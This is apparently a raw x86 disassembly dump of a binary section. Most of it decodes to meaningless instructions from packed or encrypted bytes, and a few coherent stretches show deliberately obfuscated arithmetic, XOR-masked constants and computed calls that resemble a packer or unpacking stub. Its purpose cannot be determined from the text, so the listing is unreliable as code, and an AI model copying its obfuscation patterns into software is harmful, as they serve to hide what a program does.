  40ce7a:	or     DWORD PTR [edx+0x458f20a3],edi
  40ce80:	mov    esi,0xb4da5873
  40ce85:	pusha  
  40ce86:	mov    eax,ds:0xd15ced7
  40ce8b:	sub    ch,dl
  40ce8d:	not    BYTE PTR [edx]
  40ce8f:	pop    ecx
  40ce90:	or     DWORD PTR [ecx+ebp*4-0x45],eax
  40ce94:	mov    db5,eax
  40ce97:	jmp    0x28b151f1
  40ce9c:	rol    ecx,cl
  40ce9e:	sbb    ch,BYTE PTR [edi+0x5c]
  40cea1:	sti    
  40cea2:	int3   
  40cea3:	test   al,0x7f
  40cea5:	(bad)  
  40cea6:	clc    
  40cea7:	hlt    
  40cea8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cea9:	int3   
  40ceaa:	push   ss
  40ceab:	sbb    esp,esp
  40cead:	fsubr  DWORD PTR [edi]
  40ceaf:	popf   
  40ceb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ceb1:	fdiv   DWORD PTR [edi-0x34]
  40ceb4:	jecxz  0x40ce94
  40ceb6:	mov    dh,0xb5
  40ceb8:	mov    al,BYTE PTR [edi-0x1c]
  40cebb:	add    BYTE PTR [edx],ah
  40cebd:	or     BYTE PTR [eax],bl
  40cebf:	sbb    edx,DWORD PTR [ebp+0x2a]
  40cec2:	scas   eax,DWORD PTR es:[edi]
  40cec3:	jno    0x40cf2b
  40cec5:	out    0xee,eax
  40cec7:	push   0x4076790b
  40cecc:	pop    edx
  40cecd:	out    0x49,al
  40cecf:	mov    bh,0x6b
  40ced1:	xchg   ebx,eax
  40ced2:	pusha  
  40ced3:	iret   
  40ced4:	xor    al,0xd2
  40ced6:	sub    DWORD PTR [edi],ebx
  40ced8:	sub    DWORD PTR [esi-0x79],esp
  40cedb:	and    dh,bh
  40cedd:	pop    eax
  40cede:	lods   al,BYTE PTR ds:[esi]
  40cedf:	xor    BYTE PTR [esi-0x432e3319],ah
  40cee5:	push   es
  40cee6:	jle    0x40cea6
  40cee8:	add    eax,0x608ea54f
  40ceed:	dec    edx
  40ceee:	pop    esi
  40ceef:	cmp    DWORD PTR [ebp+0x15efdcd7],edi
  40cef5:	adc    ch,BYTE PTR [ebx-0x23]
  40cef8:	stos   BYTE PTR es:[edi],al
  40cef9:	cmp    DWORD PTR [ebp+0x725178cd],ecx
  40ceff:	sbb    al,0x75
  40cf01:	mov    cl,0x1f
  40cf03:	xchg   ebp,eax
  40cf04:	dec    edi
  40cf05:	xor    al,ch
  40cf07:	inc    ebx
  40cf08:	jns    0x40ced6
  40cf0a:	pop    edi
  40cf0b:	inc    edx
  40cf0c:	outs   dx,DWORD PTR ds:[esi]
  40cf0d:	in     al,0xa7
  40cf0f:	xor    BYTE PTR [ecx],al
  40cf11:	jmp    0x7755:0xe68b6a42
  40cf18:	int    0xeb
  40cf1a:	icebp  
  40cf1b:	outs   dx,DWORD PTR ds:[esi]
  40cf1c:	lea    edx,ds:0x50e6a2ff
  40cf22:	in     eax,dx
  40cf23:	test   BYTE PTR [eax-0x7d],cl
  40cf26:	sahf   
  40cf27:	push   0x33744f1c
  40cf2c:	mov    esi,ss
  40cf2e:	jbe    0x40cf6f
  40cf30:	jle    0x40cefc
  40cf32:	xlat   BYTE PTR ds:[ebx]
  40cf33:	sbb    DWORD PTR [ecx*2+0x5a77d1a1],esp
  40cf3a:	bound  edi,QWORD PTR [edx]
  40cf3c:	lea    edi,ds:0xfb227205
  40cf42:	ret    
  40cf43:	adc    eax,ebx
  40cf45:	jl     0x40cf54
  40cf47:	mov    ah,0x10
  40cf49:	out    0x6c,eax
  40cf4b:	add    eax,0x59034c70
  40cf50:	lods   al,BYTE PTR ds:[esi]
  40cf51:	pop    ecx
  40cf52:	add    ebp,DWORD PTR [eax+0x7]
  40cf55:	sub    ebp,DWORD PTR ds:0x4dff4580
  40cf5b:	push   ds
  40cf5c:	mov    dh,0xd7
  40cf5e:	in     al,0x16
  40cf60:	push   esp
  40cf61:	xchg   esp,eax
  40cf62:	jbe    0x40cefc
  40cf64:	fs in  al,dx
  40cf66:	cmp    edi,ecx
  40cf68:	mov    edx,0x6b8b9c3c
  40cf6d:	jl     0x40cf04
  40cf6f:	sub    eax,0x9d5f1c46
  40cf74:	sahf   
  40cf75:	loopne 0x40cf71
  40cf77:	xchg   esi,eax
  40cf78:	cdq    
  40cf79:	xor    DWORD PTR ds:0xa4f0a5fc,edx
  40cf7f:	fiadd  WORD PTR [esi-0x63356902]
  40cf85:	retf   
  40cf86:	ret    
  40cf87:	sbb    ecx,edi
  40cf89:	pop    ebp
  40cf8a:	and    DWORD PTR [eax+ebp*4],0xfb909fbe
  40cf91:	out    dx,eax
  40cf92:	and    bl,BYTE PTR [ecx]
  40cf94:	dec    ebx
  40cf95:	ret    
  40cf96:	test   al,0xf7
  40cf98:	mov    WORD PTR [eax+0x2f],?
  40cf9b:	pop    ds
  40cf9c:	fst    QWORD PTR [ebx+0x56]
  40cf9f:	fisub  WORD PTR [eax]
  40cfa1:	cld    
  40cfa2:	push   ds
  40cfa3:	mov    dh,BYTE PTR [edi+ebp*1+0x2e]
  40cfa7:	sub    DWORD PTR [ebx-0x17],edi
  40cfaa:	pop    es
  40cfab:	inc    eax
  40cfac:	mov    edx,0x9a236de4
  40cfb1:	sbb    DWORD PTR [eax-0x4605a197],eax
  40cfb7:	clc    
  40cfb8:	addr16 (bad) 
  40cfbb:	mov    eax,ds:0xa584d567
  40cfc0:	xor    al,0xad
  40cfc2:	jae    0x40cf81
  40cfc4:	push   ebx
  40cfc5:	adc    DWORD PTR [esp+eax*2+0x44d5ece3],esp
  40cfcc:	(bad)  
  40cfcd:	xchg   esi,eax
  40cfce:	sbb    edi,DWORD PTR [eax-0x2f]
  40cfd1:	lods   al,BYTE PTR ds:[esi]
  40cfd2:	fwait
  40cfd3:	lds    edx,FWORD PTR cs:[eax+0x28]
  40cfd7:	into   
  40cfd8:	jmp    0x40cfe4
  40cfda:	or     cl,ah
  40cfdc:	repnz enter 0x3a4d,0x42
  40cfe1:	or     ch,dh
  40cfe3:	cmp    ebp,0xfffffffd
  40cfe6:	mov    esi,0x4b959f16
  40cfeb:	lahf   
  40cfec:	shl    DWORD PTR [esi+eax*8],1
  40cfef:	lods   al,BYTE PTR ds:[esi]
  40cff0:	cmp    al,0x2
  40cff2:	mov    gs,WORD PTR [ebx]
  40cff4:	push   ebp
  40cff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cff6:	popa   
  40cff7:	mov    bh,0xfe
  40cff9:	outs   dx,DWORD PTR ds:[esi]
  40cffa:	and    ch,cl
  40cffc:	mov    dh,0x3a
  40cffe:	ss cld 
  40d000:	mov    esp,cs
  40d002:	dec    edx
  40d003:	ss add eax,0x278f06fa
  40d009:	and    esp,ebp
  40d00b:	int    0x38
  40d00d:	imul   esp,esp,0x2056a26a
  40d013:	push   0x6fdd256e
  40d018:	push   ds
  40d019:	mov    ebx,DWORD PTR [ebp-0x7c]
  40d01c:	cwde   
  40d01d:	daa    
  40d01e:	jb     0x40d026
  40d020:	jl     0x40cfd8
  40d022:	pop    es
  40d023:	(bad)
  40d027:	add    dl,ah
  40d029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d02a:	inc    ebp
  40d02b:	mov    ds:0x3ea46648,eax
  40d030:	bound  esi,QWORD PTR [ebx+ecx*1]
  40d033:	sahf   
  40d034:	dec    ebp
  40d035:	jbe    0x40d082
  40d037:	xchg   ebp,eax
  40d038:	test   dl,cl
  40d03a:	and    BYTE PTR [esp+edx*2],dh
  40d03d:	push   edi
  40d03e:	dec    eax
  40d03f:	adc    al,0xb2
  40d041:	ss fwait
  40d043:	outs   dx,DWORD PTR ds:[esi]
  40d044:	dec    esp
  40d045:	rol    BYTE PTR [ecx+0x68],1
  40d048:	mov    ebx,0x64dc593d
  40d04d:	add    edi,DWORD PTR [edx+esi*8]
  40d050:	mov    ds:0x839dd491,eax
  40d055:	mov    al,ds:0x597634dd
  40d05a:	sub    cl,BYTE PTR [ecx+0x1b543b5b]
  40d060:	daa    
  40d061:	outs   dx,BYTE PTR ds:[esi]
  40d062:	push   edx
  40d063:	cmp    bl,BYTE PTR [edx]
  40d065:	cmc    
  40d066:	stos   DWORD PTR es:[edi],eax
  40d067:	ret    
  40d068:	das    
  40d069:	inc    ecx
  40d06a:	xchg   esp,eax
  40d06b:	cmp    esi,DWORD PTR [esi]
  40d06d:	fst    QWORD PTR [ebx]
  40d06f:	in     eax,dx
  40d070:	xchg   DWORD PTR [eax+0x9],esi
  40d073:	push   ebp
  40d074:	in     al,dx
  40d075:	call   FWORD PTR [ebp+0x31]
  40d078:	ds ret 0x634e
  40d07c:	cmp    eax,0xf3676f7c
  40d081:	rol    BYTE PTR [esi+ecx*8+0x45],cl
  40d085:	inc    edx
  40d086:	push   esi
  40d087:	sub    edx,DWORD PTR ds:0xf9c8e5a1
  40d08d:	xadd   BYTE PTR [ebx+0x74d484bb],ah
  40d094:	retf   0x71f
  40d097:	hlt    
  40d098:	push   ebx
  40d099:	pop    ecx
  40d09a:	adc    edx,DWORD PTR [edx]
  40d09c:	dec    esi
  40d09d:	cwde   
  40d09e:	push   dx
  40d0a0:	sbb    ebp,0x9f852659
  40d0a6:	jno    0x40d09e
  40d0a8:	aam    0x26
  40d0aa:	mov    BYTE PTR [edi-0x70],dl
  40d0ad:	cmp    ah,ch
  40d0af:	jno    0x40d0f5
  40d0b1:	mov    bl,0x14
  40d0b3:	out    dx,eax
  40d0b4:	sub    BYTE PTR [eax+0x1d586602],cl
  40d0ba:	outs   dx,DWORD PTR ds:[esi]
  40d0bb:	dec    esp
  40d0bc:	mov    dh,0x49
  40d0be:	mov    ch,0xfb
  40d0c0:	popf   
  40d0c1:	mov    edx,0xc267152b
  40d0c6:	and    ebp,DWORD PTR [ebx+0x72]
  40d0c9:	(bad)  
  40d0ca:	fdivr  DWORD PTR [edx+0x3f97612a]
  40d0d0:	das    
  40d0d1:	out    0xa0,eax
  40d0d3:	add    BYTE PTR ss:[esi-0x20ddcd2],al
  40d0da:	inc    ebp
  40d0db:	inc    edi
  40d0dc:	rcr    DWORD PTR [edx],1
  40d0de:	sbb    edx,0xffffffda
  40d0e1:	jnp    0x40d078
  40d0e3:	jns    0x40d0a3
  40d0e5:	addr16 (bad) 
  40d0e7:	push   cs
  40d0e8:	repnz inc eax
  40d0ea:	cdq    
  40d0eb:	mov    eax,0xec93762
  40d0f0:	in     al,dx
  40d0f1:	popa   
  40d0f2:	dec    eax
  40d0f3:	in     al,dx
  40d0f4:	dec    edx
  40d0f5:	pushf  
  40d0f6:	jge    0x40d098
  40d0f8:	scas   al,BYTE PTR es:[edi]
  40d0f9:	lock inc ecx
  40d0fb:	xchg   BYTE PTR [edi*8+0x2bc60f1],dh
  40d102:	out    0x54,al
  40d104:	jg     0x40d0b2
  40d106:	out    dx,al
  40d107:	xlat   BYTE PTR ds:[ebx]
  40d108:	pop    ebp
  40d109:	rcl    BYTE PTR [esi],1
  40d10b:	xor    al,0xba
  40d10d:	fsub   st,st(5)
  40d10f:	sahf   
  40d110:	sbb    eax,0x2321c77d
  40d115:	stc    
  40d116:	lea    esi,[ebx+0x30]
  40d119:	or     bl,BYTE PTR [edx-0x5a]
  40d11c:	bound  ecx,QWORD PTR [ecx+0x37]
  40d11f:	sub    al,0xe8
  40d121:	arpl   WORD PTR [ebx+ecx*2-0x58],si
  40d125:	out    0xab,eax
  40d127:	int3   
  40d128:	dec    esi
  40d129:	test   al,0xdc
  40d12b:	mov    esp,DWORD PTR [ebp+0x1e]
  40d12e:	fldenv [ecx]
  40d130:	cs es test al,0xd3
  40d134:	mov    ds:0x16ad3c7a,al
  40d139:	jecxz  0x40d0e5
  40d13b:	repnz imul ecx,DWORD PTR ss:[ebx+eiz*8+0x68],0x8a8fdfef
  40d145:	and    ch,BYTE PTR fs:[edx+0x53]
  40d149:	dec    ebp
  40d14a:	rcr    BYTE PTR [edx+0x6bed256b],cl
  40d150:	jge    0x40d175
  40d152:	jmp    0x40d18a
  40d154:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d155:	bound  edx,QWORD PTR [edx-0x2dafb0d5]
  40d15b:	or     bh,0x64
  40d15e:	hlt    
  40d15f:	(bad)  
  40d160:	fbld   TBYTE PTR [edi]
  40d162:	pop    edi
  40d163:	cmp    ebp,ebp
  40d165:	pop    ecx
  40d166:	fbld   TBYTE PTR ds:0xc08c5334
  40d16c:	mov    ah,0x52
  40d16e:	scas   al,BYTE PTR es:[edi]
  40d16f:	outs   dx,BYTE PTR ds:[esi]
  40d170:	pop    eax
  40d171:	aas    
  40d172:	jp     0x40d16c
  40d174:	cmp    esi,ecx
  40d176:	lds    edi,FWORD PTR [eax+0x69]
  40d179:	push   0x5ad0ba6e
  40d17e:	shl    DWORD PTR [edi+0x47],0x21
  40d182:	sub    DWORD PTR [ebp*1-0x629dea24],ecx
  40d189:	retf   
  40d18a:	test   BYTE PTR [esi-0x6e],al
  40d18d:	mov    edx,0xac87c4d9
  40d192:	inc    eax
  40d193:	sub    bh,BYTE PTR ds:0x1743c7c9
  40d199:	mov    ds:0x93f4e41e,al
  40d19e:	inc    edx
  40d19f:	(bad)  
  40d1a1:	sbb    DWORD PTR [esp+eax*4],ebx
  40d1a4:	mov    DWORD PTR [esi-0x15b61c9],0x3b67a17e
  40d1ae:	pop    ecx
  40d1af:	or     ecx,0xffffff9e
  40d1b2:	fucom  st(7)
  40d1b4:	or     ebx,DWORD PTR [ecx]
  40d1b6:	repnz mov ebp,DWORD PTR [ecx]
  40d1b9:	pop    ecx
  40d1ba:	inc    edx
  40d1bb:	sbb    al,0xc4
  40d1bd:	cmp    bl,BYTE PTR [esi+0x5f]
  40d1c0:	xor    eax,0x80ca0823
  40d1c5:	and    BYTE PTR [eax],0xe9
  40d1c8:	add    edi,ebp
  40d1ca:	mov    ecx,0xca68c892
  40d1cf:	test   al,0x1d
  40d1d1:	dec    ecx
  40d1d2:	sbb    dh,BYTE PTR [edi+0x17]
  40d1d5:	add    dl,BYTE PTR [eax+edi*4]
  40d1d8:	sub    dh,BYTE PTR [edx-0x30149c3]
  40d1de:	push   es
  40d1df:	shl    BYTE PTR [esi],0xb0
  40d1e2:	pop    ebp
  40d1e3:	jge    0x40d1f4
  40d1e5:	push   eax
  40d1e6:	adc    eax,0x5
  40d1e9:	mov    bh,0x64
  40d1eb:	ror    DWORD PTR [ecx],cl
  40d1ed:	dec    esi
  40d1ee:	ret    0xffb9
  40d1f1:	or     edi,DWORD PTR [edx+ecx*2-0x20]
  40d1f5:	cld    
  40d1f6:	adc    al,0x7f
  40d1f8:	add    DWORD PTR [esi-0x6e],ebp
  40d1fb:	popf   
  40d1fc:	std    
  40d1fd:	add    eax,0xe5a9aeeb
  40d202:	or     BYTE PTR es:[ebp+0x2e],0xc3
  40d207:	jno    0x40d1d3
  40d209:	xchg   edx,eax
  40d20a:	pusha  
  40d20b:	idiv   BYTE PTR [esi+0x39e57e9e]
  40d211:	mov    gs,edi
  40d213:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d214:	rol    BYTE PTR [ebx],cl
  40d216:	fld    QWORD PTR [eax]
  40d218:	(bad)  
  40d219:	pop    esi
  40d21a:	jle    0x40d222
  40d21c:	js     0x40d28e
  40d21e:	xor    BYTE PTR [edx],dh
  40d220:	inc    edx
  40d221:	dec    edx
  40d222:	dec    ebp
  40d223:	adc    al,0x26
  40d225:	mov    bl,0x6c
  40d227:	cmp    al,0xf6
  40d229:	inc    eax
  40d22a:	fcom   QWORD PTR [ebx]
  40d22c:	imul   ecx,eax,0x23
  40d22f:	cmp    BYTE PTR [esi+0x49],ah
  40d232:	ret    0x7e01
  40d235:	aas    
  40d236:	pop    ecx
  40d237:	sub    ebx,DWORD PTR [edx]
  40d239:	call   0xc844042c
  40d23e:	cmp    eax,0x39da7718
  40d243:	push   0xffffff91
  40d245:	and    dl,BYTE PTR [esi+edx*1]
  40d248:	sub    BYTE PTR [edi+eiz*1+0x2f8ed072],bl
  40d24f:	mov    esi,0x83b10e99
  40d254:	sub    eax,DWORD PTR [ecx+0x52]
  40d257:	imul   esp,DWORD PTR [ebx],0xe1f4af24
  40d25d:	ins    BYTE PTR es:[edi],dx
  40d25e:	jmp    0xf0f96d
  40d263:	scas   eax,DWORD PTR es:[edi]
  40d264:	clc    
  40d265:	and    al,0x84
  40d267:	in     eax,0xc9
  40d269:	dec    ebx
  40d26a:	cmc    
  40d26b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d26c:	mov    esi,0xacdae2c3
  40d271:	fnstenv [eax+eax*8]
  40d274:	cmp    al,0x70
  40d276:	enter  0x778f,0xb8
  40d27a:	or     BYTE PTR [esp+ebp*8],ah
  40d27d:	fisubr DWORD PTR [ecx]
  40d27f:	sti    
  40d280:	retf   0x2815
  40d283:	pusha  
  40d284:	loop   0x40d2f3
  40d286:	mov    DWORD PTR [eax],edi
  40d288:	push   es
  40d289:	sbb    BYTE PTR [edx],dl
  40d28b:	push   ds
  40d28c:	int3   
  40d28d:	dec    bh
  40d28f:	out    0x23,al
  40d291:	lahf   
  40d292:	fdivr  DWORD PTR [edx+0x2710fc4f]
  40d298:	mov    eax,DWORD PTR [ebp-0x1c]
  40d29b:	test   eax,eax
  40d29d:	je     0x40d339
  40d2a3:	mov    DWORD PTR [ebp-0x20],0x0
  40d2aa:	push   edx
  40d2ab:	pop    eax
  40d2ac:	push   0x5
  40d2ae:	sub    edx,eax
  40d2b0:	pop    edx
  40d2b1:	add    edx,0xa
  40d2b4:	push   edx
  40d2b5:	pop    ecx
  40d2b6:	push   0xa
  40d2b8:	dec    ecx
  40d2b9:	pop    ebx
  40d2ba:	dec    ebx
  40d2bb:	xchg   ebx,ecx
  40d2bd:	sub    ebx,ecx
  40d2bf:	xchg   ebx,ecx
  40d2c1:	dec    ecx
  40d2c2:	mov    eax,DWORD PTR [ebp-0x1c]
  40d2c5:	imul   eax,ecx
  40d2c8:	sub    esp,eax
  40d2ca:	mov    DWORD PTR [ebp-0x20],esp
  40d2cd:	mov    eax,DWORD PTR [ebp-0x4]
  40d2d0:	xor    eax,esi
  40d2d2:	add    eax,edi
  40d2d4:	jmp    0x40d312
  40d2d9:	mov    ecx,DWORD PTR [ebp-0xc]
  40d2dc:	mov    eax,DWORD PTR [ebp+0x8]
  40d2df:	mov    edx,DWORD PTR [ebp+0x14]
  40d2e2:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d2e6:	xor    ecx,esi
  40d2e8:	add    ecx,edi
  40d2ea:	xor    edx,edx
  40d2ec:	div    ecx
  40d2ee:	mov    ecx,DWORD PTR [ebp-0x4]
  40d2f1:	xor    ecx,esi
  40d2f3:	lea    eax,[ecx+eax*1+0x3272fa]
  40d2fa:	mov    ecx,DWORD PTR [ebp+0x8]
  40d2fd:	mov    edx,DWORD PTR [ebp-0x20]
  40d300:	mov    DWORD PTR [edx+ecx*4],eax
  40d303:	mov    eax,DWORD PTR [ebp-0xc]
  40d306:	mov    ecx,DWORD PTR [ebp+0x8]
  40d309:	xor    eax,esi
  40d30b:	lea    eax,[eax+ecx*1+0x3272fa]
  40d312:	mov    DWORD PTR [ebp+0x8],eax
  40d315:	mov    eax,DWORD PTR [ebp-0xc]
  40d318:	mov    ecx,DWORD PTR [ebp+0x14]
  40d31b:	xor    eax,esi
  40d31d:	add    eax,edi
  40d31f:	imul   eax,DWORD PTR [ecx]
  40d322:	mov    ecx,DWORD PTR [ebp-0x4]
  40d325:	mov    edx,DWORD PTR [ebp+0x8]
  40d328:	xor    ecx,esi
  40d32a:	lea    ecx,[ecx+edx*1+0x3272fa]
  40d331:	cmp    ecx,eax
  40d333:	jne    0x40d2d9
  40d339:	mov    eax,DWORD PTR [ebp-0x4]
  40d33c:	xor    eax,esi
  40d33e:	add    eax,edi
  40d340:	mov    DWORD PTR [ebp-0x10],eax
  40d343:	and    ebx,0x6547647
  40d349:	xor    ebx,0x8768765
  40d34f:	xchg   ebx,esi
  40d351:	xor    ebx,ebx
  40d353:	push   esi
  40d354:	mov    esi,ebx
  40d356:	pop    ebx
  40d357:	mov    edx,esi
  40d359:	add    ebx,0x1002
  40d35f:	lea    eax,[ebp-0x18]
  40d362:	add    edx,eax
  40d364:	add    edx,0x5
  40d367:	push   edx
  40d368:	inc    esi
  40d369:	pop    ecx
  40d36a:	dec    ecx
  40d36b:	xchg   ecx,eax
  40d36c:	dec    eax
  40d36d:	xchg   ecx,eax
  40d36e:	dec    ecx
  40d36f:	xchg   ecx,edx
  40d371:	dec    edx
  40d372:	push   edx
  40d373:	mov    edx,ebx
  40d375:	pop    ebx
  40d376:	dec    ebx
  40d377:	call   DWORD PTR [ebx]
  40d379:	cmp    DWORD PTR [ebp+0x10],esi
  40d37c:	je     0x40d39d
  40d382:	xchg   edx,eax
  40d383:	push   0xc
  40d385:	pop    ecx
  40d386:	dec    ecx
  40d387:	push   0x3
  40d389:	pop    ebx
  40d38a:	inc    ebx
  40d38b:	xchg   ebx,ecx
  40d38d:	inc    ecx
  40d38e:	sub    ebx,ecx
  40d390:	xchg   ebx,ecx
  40d392:	dec    ecx
  40d393:	dec    ecx
  40d394:	mov    eax,DWORD PTR [ebp-0x1c]
  40d397:	imul   eax,ecx
  40d39a:	add    esp,eax
  40d39c:	xchg   edx,eax
  40d39d:	push   eax
  40d39e:	xor    ebx,ebx
  40d3a0:	mov    edx,esp
  40d3a2:	dec    edx
  40d3a3:	inc    ebx
  40d3a4:	add    ebx,DWORD PTR [edx+ebx*1]
  40d3a7:	dec    ebx
  40d3a8:	xor    edx,edx
  40d3aa:	add    DWORD PTR [ebp-0x10],ebx
  40d3ad:	pop    ebx
  40d3ae:	mov    eax,DWORD PTR [ebp-0x10]
  40d3b1:	pop    edi
  40d3b2:	pop    esi
  40d3b3:	pop    ebx
  40d3b4:	leave  
  40d3b5:	ret    0x10
  40d3b8:	push   ebp
  40d3b9:	mov    ebp,esp
  40d3bb:	push   ecx
  40d3bc:	or     DWORD PTR ds:0x426f29,0x4a1b
  40d3c6:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40d3cd:	movzx  edx,BYTE PTR ds:0x426f19
  40d3d4:	sub    DWORD PTR ds:0x426f21,edx
  40d3da:	mov    eax,DWORD PTR [ebp-0x4]
  40d3dd:	mov    DWORD PTR ds:0x426e91,0x1a
  40d3e7:	cmp    DWORD PTR ds:0x426e91,0x0
  40d3ee:	je     0x40d421
  40d3f4:	cmp    DWORD PTR ds:0x426e91,0x24
  40d3fb:	jl     0x40d421
  40d401:	jmp    0x40d40f
  40d406:	push   DWORD PTR [ebp-0xc]
  40d409:	call   DWORD PTR ds:0x430a2c
  40d40f:	mov    edx,DWORD PTR ds:0x426e91
  40d415:	dec    edx
  40d416:	mov    DWORD PTR ds:0x426e91,edx
  40d41c:	jmp    0x40d3e7
  40d421:	mov    edx,DWORD PTR [ebp+0x10]
  40d424:	xor    ecx,0x6edc
  40d42a:	jmp    0x40f7c6
  40d42f:	mov    ah,0x4a
  40d431:	hlt    
  40d432:	mov    ebx,0x74b46574
  40d437:	ja     0x40d48b
  40d439:	out    dx,al
  40d43a:	je     0x40d403
  40d43c:	mov    ch,0xe6
  40d43e:	call   0x9cf8:0x7b7b2a1a
  40d445:	jnp    0x40d4c2
  40d447:	test   eax,0xbeee13b8
  40d44c:	and    bh,BYTE PTR ds:0xf569f55
  40d452:	pop    edx
  40d453:	aaa    
  40d454:	icebp  
  40d455:	inc    esp
  40d456:	and    BYTE PTR [eax-0x3abb2644],dl
  40d45c:	sbb    cl,BYTE PTR [edi+eax*1-0x4fa99b7c]
  40d463:	loop   0x40d4b9
  40d465:	xor    DWORD PTR [edi],ebp
  40d467:	popa   
  40d468:	daa    
  40d469:	mov    ds:0x78a7e553,eax
  40d46e:	add    BYTE PTR [esi-0x5b3d1022],al
  40d474:	mov    al,0xe
  40d477:	test   BYTE PTR [ecx-0x50],al
  40d47a:	adc    ah,BYTE PTR [eax-0x64253cf3]
  40d480:	push   es
  40d481:	adc    edi,0x1b
  40d484:	cmp    al,BYTE PTR [esi+0xc602333]
  40d48a:	inc    ebx
  40d48b:	mov    ebx,0x6f40835
  40d490:	addr16 inc bp
  40d493:	cmp    bh,BYTE PTR [ecx-0xd4e9a2d]
  40d499:	ret    0x860e
  40d49c:	jbe    0x40d4dc
  40d49e:	sbb    bl,ch
  40d4a0:	scas   eax,DWORD PTR es:[edi]
  40d4a1:	aam    0x89
  40d4a3:	out    0xda,eax
  40d4a5:	addr16 stc 
  40d4a7:	xchg   BYTE PTR [edx+0x5a],al
  40d4aa:	icebp  
  40d4ab:	sub    DWORD PTR [ebx],edx
  40d4ad:	mov    BYTE PTR [edi-0x2f8b8425],cl
  40d4b3:	xor    BYTE PTR [edi+0x19],0x81
  40d4b7:	pop    ds
  40d4b8:	std    
  40d4b9:	push   esi
  40d4ba:	jae    0x40d4c1
  40d4bc:	jmp    0x1921c244
  40d4c1:	into   
  40d4c2:	mov    bh,cl
  40d4c4:	dec    edi
  40d4c5:	jmp    0x4a23:0x21137161
  40d4cc:	ds (bad) 
  40d4cf:	sub    eax,0xa7500943
  40d4d4:	js     0x40d527
  40d4d6:	test   al,0xf0
  40d4d8:	and    eax,0x3596440b
  40d4dd:	mov    ss,WORD PTR [ecx-0x4]
  40d4e0:	call   DWORD PTR [ebp+0x2a]
  40d4e3:	icebp  
  40d4e4:	sub    DWORD PTR [ebx+0x23],ecx
  40d4e7:	iret   
  40d4e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4e9:	fcom   DWORD PTR [edx-0x80]
  40d4ec:	test   al,0xf
  40d4ee:	shr    BYTE PTR [ecx-0x1cf5fac9],1
  40d4f4:	leave  
  40d4f5:	in     eax,0x74
  40d4f7:	adc    al,0x94
  40d4f9:	xchg   BYTE PTR [edx+0x48],bh
  40d4fc:	lock ds das 
  40d4ff:	iret   
  40d500:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40d502:	js     0x40d532
  40d504:	mov    ebx,0xc62a7e12
  40d509:	dec    edx
  40d50a:	and    dl,cl
  40d50c:	push   ds
  40d50d:	ret    
  40d50e:	xor    esp,DWORD PTR [esi]
  40d510:	mov    dl,0xe8
  40d512:	cmc    
  40d513:	cmp    BYTE PTR fs:[edx-0x3],bh
  40d517:	out    dx,al
  40d518:	nop
  40d519:	push   eax
  40d51a:	add    eax,0x8d65af28
  40d51f:	cmc    
  40d520:	and    esi,DWORD PTR [edi+ebx*1+0x62d0b5b5]
  40d527:	sbb    BYTE PTR [ebx],dh
  40d529:	into   
  40d52a:	sti    
  40d52b:	stos   BYTE PTR es:[edi],al
  40d52c:	adc    ebp,DWORD PTR [ebx-0x2d]
  40d52f:	push   edx
  40d530:	leave  
  40d531:	arpl   WORD PTR [edi],di
  40d533:	xchg   ebp,eax
  40d534:	inc    edi
  40d535:	mov    bl,BYTE PTR [edi+0x12]
  40d538:	jmp    0xefd5:0x488e3e53
  40d53f:	mov    ds:0xc7826677,al
  40d544:	mov    dh,0x9a
  40d546:	cld    
  40d547:	pop    es
  40d548:	lea    eax,[esi+0x343c040c]
  40d54e:	sbb    BYTE PTR [ebx+0x7c],0xc3
  40d552:	jge    0x40d4fe
  40d554:	jmp    0x40d5b8
  40d556:	ret    
  40d557:	adc    DWORD PTR [edx+esi*4-0x2b],ebx
  40d55b:	jmp    0xde4b:0x9a4a0d3f
  40d562:	addr16 (bad) 
  40d564:	nop
  40d565:	mov    dh,0x98
  40d567:	xchg   edx,eax
  40d568:	mov    ebp,0xb7ce56c5
  40d56d:	push   ebp
  40d56e:	mov    bl,BYTE PTR [eax+0x5f]
  40d571:	retf   
  40d572:	jo     0x40d5d6
  40d574:	test   eax,0x21a0fbbd
  40d579:	mov    esi,0x45c07289
  40d57e:	xor    BYTE PTR [ebp+0x1a],al
  40d581:	fidiv  DWORD PTR [ecx]
  40d583:	pop    ecx
  40d584:	fbld   TBYTE PTR [esi+0x26b23f5]
  40d58a:	cmp    DWORD PTR [eax],edi
  40d58c:	mov    es,eax
  40d58e:	rcr    DWORD PTR [ebp+eax*1-0x53],cl
  40d592:	push   esi
  40d593:	jge    0x40d613
  40d595:	pop    esp
  40d596:	(bad)  
  40d597:	sti    
  40d598:	daa    
  40d599:	stos   DWORD PTR es:[edi],eax
  40d59a:	sub    DWORD PTR [ebp+0x38],ecx
  40d59d:	loope  0x40d59f
  40d59f:	push   ecx
  40d5a0:	mov    WORD PTR [edi+0x34],fs
  40d5a3:	outs   dx,DWORD PTR ds:[esi]
  40d5a4:	repz scas al,BYTE PTR es:[edi]
  40d5a6:	cmp    BYTE PTR [ebp-0x61abe53b],dl
  40d5ac:	mov    es,WORD PTR [ebx]
  40d5ae:	sub    BYTE PTR [edx+0x56db1b56],0xc3
  40d5b5:	inc    esp
  40d5b6:	(bad)  
  40d5b7:	dec    ebx
  40d5b8:	lods   al,BYTE PTR ds:[esi]
  40d5b9:	inc    esi
  40d5ba:	pop    esi
  40d5bb:	out    dx,eax
  40d5bc:	stos   BYTE PTR es:[edi],al
  40d5bd:	das    
  40d5be:	push   eax
  40d5bf:	loop   0x40d62c
  40d5c1:	dec    esp
  40d5c2:	cdq    
  40d5c3:	pop    es
  40d5c4:	push   ecx
  40d5c5:	inc    eax
  40d5c6:	rcl    BYTE PTR [ebx+0x371f90b1],0xe8
  40d5cd:	sti    
  40d5ce:	iret   
  40d5cf:	pop    ds
  40d5d0:	and    esp,DWORD PTR [ecx]
  40d5d2:	sbb    BYTE PTR [ebx+0x6],dl
  40d5d5:	and    al,0x52
